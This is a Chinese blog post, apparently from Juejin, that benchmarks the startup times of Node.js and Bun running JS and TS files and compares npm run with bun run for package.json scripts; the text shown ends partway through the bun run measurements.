                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在 JavaScript 后端运行时领域，速度一直是核心战场。近年来，Bun 以其宣称的“一体化”工具链和闪电般的启动速度异军突起，对老牌王者 Node.js 发起了强劲挑战。<code>bun run</code> 的迅捷，让许多开发者开始重新评估他们的工具选择。</p>
<p>然而，Node.js 并未止步。自 v22.0.0 起，它悄然引入了一个专为启动性能而生的秘密武器：<code>node --run</code>。这个内置于 Node.js 核心的命令，旨在以最精简、最直接的方式执行 <code>package.json</code> 中的脚本，宣称要为最常见的用例提供“顶级性能”。</p>
<p>这引发了我们的好奇：在真实的场景下，这位新秀的表现究竟如何？它与 <code>bun run</code> 及传统的 <code>npm run</code> 相比，孰优孰劣？</p>
<p>本文将通过一系列严谨的对比测试，揭开 <a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fdocs%2Flatest%2Fapi%2Fcli.html%23--run" target="_blank" title="https://nodejs.org/docs/latest/api/cli.html#--run" ref="nofollow noopener noreferrer"><code>node --run</code></a> 的神秘面纱，用数据回答：在 2026 年的脚本启动性能竞赛中，谁才是真正的速度王者？</p>
<p><strong/></p><p align="center"><strong>各位小伙伴请注意！本文将颠覆这个传统观念“bun 启动一定比 Node.js 更快”。</strong></p><p/>
<hr/>
<p>首先我们回顾下 Node.js 运行文件有三种方式：</p>
<ol>
<li>直接启动 <code>node foo.[jt]s</code> 🤼‍♂️ <code>bun foo.[jt]s</code></li>
<li>package.json 脚本运行 <code>npm run foo</code> 🤼‍♂️ <code>bun run foo</code></li>
<li>脚本 <code>--run</code> 直接运行 <code>node --run foo</code> <em>Added in: v22.0.0</em> 🤼‍♂️ <code>bun --run foo</code></li>
</ol>
<p>统计方法，我们模仿竞技比赛中，去掉一个最高分和一个最低分，可以避免“冷启动”等极端数据干扰，采取去掉最大和最小值然后取平均值，这样<strong>抗干扰性强</strong>、<strong>更公平</strong>。</p>
<h2 data-id="heading-1">第一轮：直接启动 JS 文件速度</h2>
<p>分别启动两个 mjs 文件，一个空一个有 IO 输出。测试文件：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// empty.mjs</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// io.mjs</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hello world'</span>);

</code></pre>
<h3 data-id="heading-2">Node.js 🟢</h3>
<p>分别执行 <code>time node empty.js</code> <code>time node io.mjs</code> 各自三次。</p>
<p><code>❯ time node empty.mjs</code>：</p>
<pre><code class="hljs language-ts" lang="ts">node empty.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">78</span>% cpu <span class="hljs-number">0.217</span> total
node empty.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">84</span>% cpu <span class="hljs-number">0.203</span> total
node empty.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>16s system <span class="hljs-number">69</span>% cpu <span class="hljs-number">0.225</span> total
</code></pre>
<p>无 io 平均耗时：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≈</mo><mn>217</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx217ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">217</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>。</p>
<p><code>❯ time node io.mjs</code>：</p>
<pre><code class="hljs language-ts" lang="ts">node io.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">73</span>% cpu <span class="hljs-number">0.234</span> total
node io.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">72</span>% cpu <span class="hljs-number">0.236</span> total
node io.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">74</span>% cpu <span class="hljs-number">0.229</span> total
</code></pre>
<p>io 平均耗时：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≈</mo><mn>234</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx234ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">234</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>。</p>
<p>整体耗时：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≈</mo><mn>225</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx225ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">225</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>。</p>
<h3 data-id="heading-3">Bun 🍞</h3>
<pre><code class="hljs language-ts" lang="ts">bun empty.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>04s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">56</span>% cpu <span class="hljs-number">0.375</span> total
bun empty.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">63</span>% cpu <span class="hljs-number">0.337</span> total
bun empty.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>03s user <span class="hljs-number">0.</span>23s system <span class="hljs-number">70</span>% cpu <span class="hljs-number">0.371</span> total
</code></pre>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≈</mo><mn>371</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx371ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">371</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span></p>
<pre><code class="hljs language-ts" lang="ts">bun io.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>05s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">63</span>% cpu <span class="hljs-number">0.338</span> total
bun io.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>20s system <span class="hljs-number">56</span>% cpu <span class="hljs-number">0.351</span> total
bun io.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>03s user <span class="hljs-number">0.</span>20s system <span class="hljs-number">62</span>% cpu <span class="hljs-number">0.369</span> total
</code></pre>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≈</mo><mn>351</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx351ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">351</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span></p>
<p>整体：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≈</mo><mn>361</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx361ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">361</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span></p>
<p>这数据有点反常，1 bun 启动 io 文件速度反而快于空文件，2 其次得到本文第一个<strong>非常重要的结论：bun 对 js 文件启动速度反而劣于 Node.js</strong>（二者相差 100ms+）。</p>
<h2 data-id="heading-4">第二轮：直接启动 TS 文件速度</h2>
<blockquote>
<p>[!TIP]
注意：想要不加参数直接运行 TS，Node.js 版本需 <strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≥</mo></mrow><annotation encoding="application/x-tex">\geq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"/><span class="mrel">≥</span></span></span></span></span> v22.18.0</strong>。</p>
</blockquote>
<p>分别启动两个 ts 文件，一个空一个有 IO 输出。测试文件：</p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># 文件内容一样</span>
empty-ts.ts
io-ts.ts
</code></pre>
<h3 data-id="heading-5">Node.js 🟢</h3>
<pre><code class="hljs language-ts" lang="ts">node empty-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>19s system <span class="hljs-number">73</span>% cpu <span class="hljs-number">0.254</span> total
node empty-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">72</span>% cpu <span class="hljs-number">0.236</span> total
node empty-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">71</span>% cpu <span class="hljs-number">0.240</span> total
</code></pre>
<p>无 io 平均耗时：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≈</mo><mn>240</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx240ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">240</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>。</p>
<p><code>❯ time node io-ts.ts</code>：</p>
<pre><code class="hljs language-ts" lang="ts">node io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">64</span>% cpu <span class="hljs-number">0.263</span> total
node io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">67</span>% cpu <span class="hljs-number">0.255</span> total
node io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">67</span>% cpu <span class="hljs-number">0.254</span> total
</code></pre>
<p>io 平均耗时：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≈</mo><mn>255</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx255ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">255</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>。</p>
<p>整体耗时：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≈</mo><mn>248</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx248ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">248</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>。</p>
<blockquote>
<p>[!TIP]
小结：Node.js 运行 ts 耗时比 js 增加 <strong>~20ms</strong>，这在预期内因为先要 <a href="https://juejin.cn/spost/7407763018472046629#heading-12" target="_blank" title="https://juejin.cn/spost/7407763018472046629#heading-12">amacro ts 编译器即将所有类型用空格替代</a>。</p>
</blockquote>
<h3 data-id="heading-6">Bun 🍞</h3>
<pre><code class="hljs language-ts" lang="ts">bun empty-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>04s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">69</span>% cpu <span class="hljs-number">0.372</span> total
bun empty-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>01s user <span class="hljs-number">0.</span>15s system <span class="hljs-number">45</span>% cpu <span class="hljs-number">0.372</span> total
bun empty-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>06s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">56</span>% cpu <span class="hljs-number">0.402</span> total
</code></pre>
<p>无 io 平均耗时：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≈</mo><mn>372</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx372ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">372</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>。</p>
<pre><code class="hljs language-ts" lang="ts">bun io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>01s user <span class="hljs-number">0.</span>25s system <span class="hljs-number">64</span>% cpu <span class="hljs-number">0.405</span> total
bun io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">55</span>% cpu <span class="hljs-number">0.388</span> total
bun io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>09s user <span class="hljs-number">0.</span>23s system <span class="hljs-number">74</span>% cpu <span class="hljs-number">0.429</span> total
</code></pre>
<p>io 平均耗时：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≈</mo><mn>405</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx 405ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">405</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>。</p>
<p>整体耗时：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≈</mo><mn>388.5</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx 388.5ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">388.5</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>。</p>
<blockquote>
<p>[!TIP]
小结：Bun 运行 ts 耗时比 js 增加 <strong>~20ms</strong>，预期内。</p>
</blockquote>
<p>本文第二个<strong>结论：bun 执行 ts 文件启动速度劣于 Node.js</strong>（二者相差 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>388</mn><mo>−</mo><mn>248</mn><mo>=</mo><mn>140</mn><mi>m</mi><mi>s</mi><mo>+</mo></mrow><annotation encoding="application/x-tex">388 - 248 = 140ms+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">388</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">248</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">140</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mord">+</span></span></span></span></span>）。</p>
<p>有读者可能会问是否是通过环境变量寻址 bun 耗时导致的。那我们直接跳过寻址：</p>
<p><code>❯ time /e/pnpm/bun io-ts.ts</code></p>
<pre><code class="hljs language-ts" lang="ts">/e/pnpm/bun io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">55</span>% cpu <span class="hljs-number">0.384</span> total
/e/pnpm/bun io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>23s system <span class="hljs-number">67</span>% cpu <span class="hljs-number">0.341</span> total
/e/pnpm/bun io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>06s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">56</span>% cpu <span class="hljs-number">0.407</span> total
</code></pre>
<p>直接寻址耗时 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>384</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex"> 384ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">384</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>，确实少于 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>405</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex"> 405ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">405</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>，但依然显著高于 Node.js 的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>255</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">255ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">255</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>！所以</p>
<h2 data-id="heading-7">结论一</h2>
<p>Bun 无论<strong>启动</strong> JavaScript 还是 TypeScript 文件<strong>都要慢于 Node.js</strong>！</p>
<blockquote>
<p>注意这里是<strong>启动</strong>而非运行。</p>
</blockquote>
<h2 data-id="heading-8">第三轮：package.json 脚本启动</h2>
<p>结论先行：执行 package.json 内的 scripts <code>bun run</code> 的启动速度快于 <code>npm run</code>。我们测试下。</p>
<p>npm v11.7.0</p>
<p>我们定义两个 script io 和不含 io 的：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"module"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"io"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo \"hello world\""</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"empty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">""</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-9">npm run</h3>
<p><code>❯ time command npm run io</code></p>
<blockquote>
<p>[!TIP]
<code>command npm</code> 是因为我在 <code>~/.zshrc</code> 内对 npm 做了同名 alias 需通过 <code>command</code> 找到原始命令。</p>
</blockquote>
<pre><code class="hljs language-ts" lang="ts">&gt; rsbuild-react-<span class="hljs-number">19</span>@<span class="hljs-number">1.0</span><span class="hljs-number">.0</span> io
&gt; io <span class="hljs-string">"hello world"</span>

<span class="hljs-string">"hello world"</span>
command npm run io  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>39s system <span class="hljs-number">58</span>% cpu <span class="hljs-number">0.660</span> total
</code></pre>
<pre><code class="hljs language-ts" lang="ts">command npm run io  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>34s system <span class="hljs-number">52</span>% cpu <span class="hljs-number">0.649</span> total
command npm run io  <span class="hljs-number">0.</span>01s user <span class="hljs-number">0.</span>31s system <span class="hljs-number">50</span>% cpu <span class="hljs-number">0.638</span> total
</code></pre>
<p><code>npm run io</code> 耗时：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>650</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">650ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">650</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>。</p>
<p>去除 IO：<code>❯ time command npm run empty</code></p>
<pre><code class="hljs language-ts" lang="ts">command npm run empty  <span class="hljs-number">0.</span>05s user <span class="hljs-number">0.</span>32s system <span class="hljs-number">60</span>% cpu <span class="hljs-number">0.610</span> total
command npm run empty  <span class="hljs-number">0.</span>03s user <span class="hljs-number">0.</span>34s system <span class="hljs-number">59</span>% cpu <span class="hljs-number">0.626</span> total
command npm run empty  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>33s system <span class="hljs-number">53</span>% cpu <span class="hljs-number">0.611</span> total
</code></pre>
<p>纯启动耗时 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>616</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">616ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">616</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>。</p>
<p>整体耗时：<code>npm run</code> 启动需 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≈</mo><mn>600</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx600ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">600</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>。这也太慢了，代码啥都没干呢！</p>
<p>接下来试试 <code>bun run</code>。</p>
<h3 data-id="heading-10">bun run</h3>
<p><code>❯ time bun run io</code>:</p>
<pre><code class="hljs language-ts" lang="ts">bun run io  <span class="hljs-number">0.</span>03s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">79</span>% cpu <span class="hljs-number">0.308</span> total
bun run io  <span class="hljs-number">0.</span>06s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">78</span>% cpu <span class="hljs-number">0.347</span> total
bun run io  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">68</span>% cpu <span class="hljs-number">0.313</span> total
</code></pre>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>313</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">313 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">313</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span> 左右</p>
<p><code>❯ time bun run empty</code>：</p>
<pre><code class="hljs language-ts" lang="ts">bun run empty  <span class="hljs-number">0.</span>04s user <span class="hljs-number">0.</span>18s system <span class="hljs-number">60</span>% cpu <span class="hljs-number">0.380</span> total
bun run empty  <span class="hljs-number">0.</span>01s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">69</span>% cpu <span class="hljs-number">0.330</span> total
bun run empty  <span class="hljs-number">0.</span>03s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">67</span>% cpu <span class="hljs-number">0.361</span> total
</code></pre>
